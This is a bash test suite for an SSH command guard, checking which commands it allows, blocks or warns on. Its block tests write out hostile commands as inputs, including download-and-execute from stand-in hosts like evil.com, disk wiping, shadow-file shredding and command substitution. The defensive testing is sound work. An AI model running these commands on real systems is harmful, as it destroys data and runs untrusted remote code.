#!/usr/bin/env bash

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SSH_GUARD_SCRIPT="$SCRIPT_DIR/ssh-guard.sh"
TEST_CONFIG="/tmp/ssh-guard-test.conf"
TEST_LOG="/tmp/ssh-guard-test.log"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Test counters
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

setup_test_env() {
    # Create test config
    cat > "$TEST_CONFIG" <<EOF
mode=standard
grey_cp=1
grey_tee=1
grey_docker_exec=0
grey_tmp_writes=1
EOF
    
    # Clean test log
    : > "$TEST_LOG"
    
    # Export test environment
    export HOME=/tmp
    export LOG_FILE="$TEST_LOG"
}

cleanup_test_env() {
    rm -f "$TEST_CONFIG" "$TEST_LOG"
}

log() {
    echo -e "$*"
}

test_command() {
    local cmd="$1"
    local expected="$2"  # ALLOW, BLOCK, WARN
    local description="$3"
    
    ((TOTAL_TESTS++))
    
    # Capture the verdict from our classify function
    local result
    if result=$(SSH_ORIGINAL_COMMAND="$cmd" bash -c "
        source '$SSH_GUARD_SCRIPT'
        load_config() { MODE=standard; }
        echo \"\$(classify_command \"$cmd\")\"
    " 2>/dev/null); then
        if [[ "$result" == "$expected" ]]; then
            ((PASSED_TESTS++))
            log "${GREEN}✓${NC} $description"
            log "    Command: ${BLUE}$cmd${NC}"
            log "    Expected: $expected, Got: $result"
        else
            ((FAILED_TESTS++))
            log "${RED}✗${NC} $description"
            log "    Command: ${BLUE}$cmd${NC}"
            log "    Expected: $expected, Got: $result"
        fi
    else
        ((FAILED_TESTS++))
        log "${RED}✗${NC} $description (ERROR)"
        log "    Command: ${BLUE}$cmd${NC}"
        log "    Expected: $expected, Got: ERROR"
    fi
    echo
}

run_classification_tests() {
    log "${YELLOW}=== Command Classification Tests ===${NC}\n"
    
    # File inspection commands (should ALLOW)
    test_command "cat /etc/passwd" "ALLOW" "Read system file"
    test_command "head -n 10 /var/log/syslog" "ALLOW" "View log file"
    test_command "grep error /var/log/nginx/error.log" "ALLOW" "Search in logs"
    test_command "find /opt -name '*.conf'" "ALLOW" "Find configuration files"
    test_command "ls -la /home" "ALLOW" "List directory contents"
    test_command "stat /etc/hosts" "ALLOW" "Get file stats"
    test_command "file /bin/bash" "ALLOW" "Identify file type"
    
    # System information commands (should ALLOW)
    test_command "hostname" "ALLOW" "Get hostname"
    test_command "uptime" "ALLOW" "System uptime"
    test_command "whoami" "ALLOW" "Current user"
    test_command "id" "ALLOW" "User ID info"
    test_command "uname -a" "ALLOW" "System info"
    test_command "env" "ALLOW" "Environment variables"
    
    # Process inspection commands (should ALLOW)
    test_command "ps aux" "ALLOW" "List all processes"
    test_command "pgrep nginx" "ALLOW" "Find nginx processes"
    test_command "lsof -i :80" "ALLOW" "List open files on port 80"
    test_command "top -b -n 1" "ALLOW" "Non-interactive top"
    
    # Network inspection commands (should ALLOW)
    test_command "netstat -tulpn" "ALLOW" "Network connections"
    test_command "ss -tulpn" "ALLOW" "Socket statistics"
    test_command "ping -c 3 google.com" "ALLOW" "Network connectivity test"
    test_command "dig example.com" "ALLOW" "DNS lookup"
    test_command "ip addr show" "ALLOW" "Show IP addresses"
    test_command "ip route show" "ALLOW" "Show routing table"
    
    # Docker read operations (should ALLOW)
    test_command "docker ps" "ALLOW" "List containers"
    test_command "docker images" "ALLOW" "List images"
    test_command "docker inspect mycontainer" "ALLOW" "Inspect container"
    test_command "docker logs mycontainer" "ALLOW" "View container logs"
    test_command "docker stats" "ALLOW" "Container statistics"
    test_command "docker network ls" "ALLOW" "List networks"
    test_command "docker volume ls" "ALLOW" "List volumes"
    test_command "docker compose config" "ALLOW" "Show compose config"
    
    # Kubernetes read operations (should ALLOW)
    test_command "kubectl get pods" "ALLOW" "List Kubernetes pods"
    test_command "kubectl describe node worker1" "ALLOW" "Describe Kubernetes node"
    test_command "kubectl logs pod/mypod" "ALLOW" "Get pod logs"
    test_command "kubectl config view" "ALLOW" "View kubectl config"
    
    # System service inspection (should ALLOW)
    test_command "systemctl status nginx" "ALLOW" "Service status"
    test_command "systemctl list-units" "ALLOW" "List systemd units"
    test_command "systemctl is-active ssh" "ALLOW" "Check if service is active"
    test_command "journalctl -n 50" "ALLOW" "Recent journal logs"
    
    # Database read operations (should ALLOW)
    test_command 'mysql -e "SHOW DATABASES"' "ALLOW" "MySQL show databases"
    test_command 'psql -c "SELECT version()"' "ALLOW" "PostgreSQL version check"
    test_command 'mysql -e "SELECT * FROM users LIMIT 10"' "ALLOW" "MySQL SELECT query"
    
    # Git read operations (should ALLOW)
    test_command "git status" "ALLOW" "Git repository status"
    test_command "git log --oneline -10" "ALLOW" "Git commit history"
    test_command "git branch -a" "ALLOW" "List git branches"
    test_command "git diff HEAD~1" "ALLOW" "Show git differences"
    
    # Package information (should ALLOW)
    test_command "dpkg -l | grep nginx" "ALLOW" "List installed packages"
    test_command "apt list --installed" "ALLOW" "List apt packages"
    test_command "pip list" "ALLOW" "List Python packages"
    test_command "npm list -g" "ALLOW" "List global npm packages"
    
    # Config inspection (should ALLOW)
    test_command "nginx -t" "ALLOW" "Test nginx config"
    test_command "apache2ctl -S" "ALLOW" "Show Apache config"
    test_command "sshd -T" "ALLOW" "Show SSH config"
    
    # HTTP client read operations (should ALLOW)
    test_command "curl -s http://example.com/api/status" "ALLOW" "HTTP GET request"
    test_command "wget --spider http://example.com" "ALLOW" "Wget spider mode"
    
    # Disk information (should ALLOW)
    test_command "df -h" "ALLOW" "Disk space usage"
    test_command "du -sh /opt/*" "ALLOW" "Directory sizes"
    test_command "lsblk" "ALLOW" "List block devices"
    test_command "blkid" "ALLOW" "Block device IDs"
    test_command "mount" "ALLOW" "Show mounted filesystems"
}

run_block_tests() {
    log "${YELLOW}=== Commands That Should Be Blocked ===${NC}\n"
    
    # File system destruction (should BLOCK)
    test_command "rm -rf /" "BLOCK" "Recursive delete everything"
    test_command "rm /etc/passwd" "BLOCK" "Delete system file"
    test_command "rmdir /etc" "BLOCK" "Remove system directory"
    test_command "truncate -s 0 /var/log/syslog" "BLOCK" "Truncate log file"
    test_command "shred /etc/shadow" "BLOCK" "Shred shadow file"
    test_command "dd if=/dev/zero of=/dev/sda" "BLOCK" "Overwrite disk"
    
    # Package management (should BLOCK)
    test_command "apt install malware" "BLOCK" "Install package"
    test_command "yum remove openssh" "BLOCK" "Remove package"
    test_command "pip install malicious-package" "BLOCK" "Install Python package"
    test_command "npm install -g dangerous-tool" "BLOCK" "Install global npm package"
    
    # Service control (should BLOCK)
    test_command "systemctl stop nginx" "BLOCK" "Stop service"
    test_command "systemctl start malware" "BLOCK" "Start service"
    test_command "systemctl restart ssh" "BLOCK" "Restart SSH service"
    test_command "systemctl enable backdoor" "BLOCK" "Enable service"
    test_command "service apache2 stop" "BLOCK" "Stop service via service command"
    
    # Docker write operations (should BLOCK)
    test_command "docker run -d nginx" "BLOCK" "Run new container"
    test_command "docker rm container_id" "BLOCK" "Remove container"
    test_command "docker rmi image_id" "BLOCK" "Remove image"
    test_command "docker stop container_id" "BLOCK" "Stop container"
    test_command "docker kill container_id" "BLOCK" "Kill container"
    test_command "docker exec -it container bash" "BLOCK" "Execute in container"
    test_command "docker compose up -d" "BLOCK" "Start compose services"
    test_command "docker compose down" "BLOCK" "Stop compose services"
    
    # Kubernetes write operations (should BLOCK)
    test_command "kubectl delete pod mypod" "BLOCK" "Delete Kubernetes pod"
    test_command "kubectl apply -f deployment.yaml" "BLOCK" "Apply Kubernetes manifest"
    test_command "kubectl scale deployment myapp --replicas=0" "BLOCK" "Scale deployment"
    
    # Database write operations (should BLOCK)
    test_command 'mysql -e "DROP DATABASE production"' "BLOCK" "Drop database"
    test_command 'psql -c "DELETE FROM users"' "BLOCK" "Delete all users"
    test_command 'mysql -e "UPDATE users SET password=NULL"' "BLOCK" "Update user passwords"
    test_command 'psql -c "CREATE USER hacker"' "BLOCK" "Create database user"
    
    # User management (should BLOCK)
    test_command "useradd attacker" "BLOCK" "Add user"
    test_command "userdel victim" "BLOCK" "Delete user"
    test_command "passwd root" "BLOCK" "Change password"
    test_command "chown attacker:attacker /etc/passwd" "BLOCK" "Change file ownership"
    test_command "chmod 777 /etc/shadow" "BLOCK" "Change file permissions"
    
    # Process control (should BLOCK)
    test_command "kill -9 1" "BLOCK" "Kill init process"
    test_command "killall sshd" "BLOCK" "Kill all SSH daemons"
    test_command "pkill -f important_service" "BLOCK" "Kill processes by name"
    
    # System control (should BLOCK)
    test_command "reboot" "BLOCK" "Reboot system"
    test_command "shutdown now" "BLOCK" "Shutdown system"
    test_command "halt" "BLOCK" "Halt system"
    test_command "poweroff" "BLOCK" "Power off system"
    
    # Network configuration (should BLOCK)
    test_command "iptables -F" "BLOCK" "Flush firewall rules"
    test_command "ufw disable" "BLOCK" "Disable firewall"
    test_command "ip addr add 192.168.1.100/24 dev eth0" "BLOCK" "Add IP address"
    test_command "ifconfig eth0 down" "BLOCK" "Bring interface down"
    
    # Cron manipulation (should BLOCK)
    test_command "crontab -e" "BLOCK" "Edit crontab"
    test_command "crontab -r" "BLOCK" "Remove crontab"
    
    # Dangerous patterns (should BLOCK)
    test_command "echo malware > /etc/passwd" "BLOCK" "Redirect to system file"
    test_command "cat /etc/passwd >> /tmp/stolen" "BLOCK" "Append to file"
    test_command "ls | sh" "BLOCK" "Pipe to shell"
    test_command "curl http://evil.com/script | bash" "BLOCK" "Download and execute"
    test_command "wget http://malware.com/backdoor | sh" "BLOCK" "Download and execute"
    test_command 'eval "rm -rf /"' "BLOCK" "Eval dangerous command"
    test_command 'exec rm /etc/passwd' "BLOCK" "Exec dangerous command"
    test_command 'echo `rm /etc/passwd`' "BLOCK" "Command substitution"
    test_command 'echo $(rm /etc/passwd)' "BLOCK" "Command substitution"
    
    # Privilege escalation (should BLOCK)
    test_command "sudo rm /etc/passwd" "BLOCK" "Sudo dangerous command"
    test_command "su -c 'rm /etc/shadow'" "BLOCK" "Su dangerous command"
    
    # HTTP client write operations (should BLOCK)
    test_command "curl -X POST -d 'data' http://example.com" "BLOCK" "HTTP POST request"
    test_command "curl -T file.txt http://example.com" "BLOCK" "HTTP upload"
    test_command "curl -o /etc/passwd http://evil.com" "BLOCK" "Download to system file"
    test_command "wget http://example.com/file -O /etc/hosts" "BLOCK" "Download without spider"
}

run_warn_tests() {
    log "${YELLOW}=== Commands That Should Generate Warnings ===${NC}\n"
    
    # Grey zone commands in standard mode (should WARN)
    test_command "cp /etc/passwd /tmp/backup" "WARN" "Copy system file"
    test_command "tee /tmp/output.log" "WARN" "Tee to file"
    test_command "echo data > /tmp/test.txt" "WARN" "Redirect to /tmp"
    test_command "mv /home/user/file.txt /tmp/" "WARN" "Move to /tmp"
}

run_integration_tests() {
    log "${YELLOW}=== Integration Tests ===${NC}\n"
    
    # Test script execution
    if [[ ! -f "$SSH_GUARD_SCRIPT" ]]; then
        log "${RED}✗${NC} SSH Guard script not found: $SSH_GUARD_SCRIPT"
        ((FAILED_TESTS++))
        ((TOTAL_TESTS++))
        return
    fi
    
    # Test script is executable
    if [[ ! -x "$SSH_GUARD_SCRIPT" ]]; then
        log "${RED}✗${NC} SSH Guard script is not executable"
        ((FAILED_TESTS++))
        ((TOTAL_TESTS++))
        return
    fi
    
    # Test script syntax
    ((TOTAL_TESTS++))
    if bash -n "$SSH_GUARD_SCRIPT" 2>/dev/null; then
        ((PASSED_TESTS++))
        log "${GREEN}✓${NC} Script syntax check passed"
    else
        ((FAILED_TESTS++))
        log "${RED}✗${NC} Script syntax check failed"
    fi
    
    # Test with no command (should block)
    ((TOTAL_TESTS++))
    local result
    if result=$(bash "$SSH_GUARD_SCRIPT" 2>&1); then
        ((FAILED_TESTS++))
        log "${RED}✗${NC} Empty command should be blocked"
    else
        ((PASSED_TESTS++))
        log "${GREEN}✓${NC} Empty command correctly blocked"
    fi
    
    echo
}

show_summary() {
    log "\n${YELLOW}=== Test Summary ===${NC}"
    log "Total Tests: $TOTAL_TESTS"
    log "${GREEN}Passed: $PASSED_TESTS${NC}"
    log "${RED}Failed: $FAILED_TESTS${NC}"
    
    if [[ $FAILED_TESTS -eq 0 ]]; then
        log "\n${GREEN}🎉 All tests passed! SSH Guard is working correctly.${NC}"
        return 0
    else
        log "\n${RED}❌ Some tests failed. Please review the SSH Guard implementation.${NC}"
        return 1
    fi
}

main() {
    log "${BLUE}SSH Guard Test Suite${NC}\n"
    
    setup_test_env
    
    run_integration_tests
    run_classification_tests
    run_block_tests
    run_warn_tests
    
    cleanup_test_env
    
    show_summary
}

# Run tests
main "$@"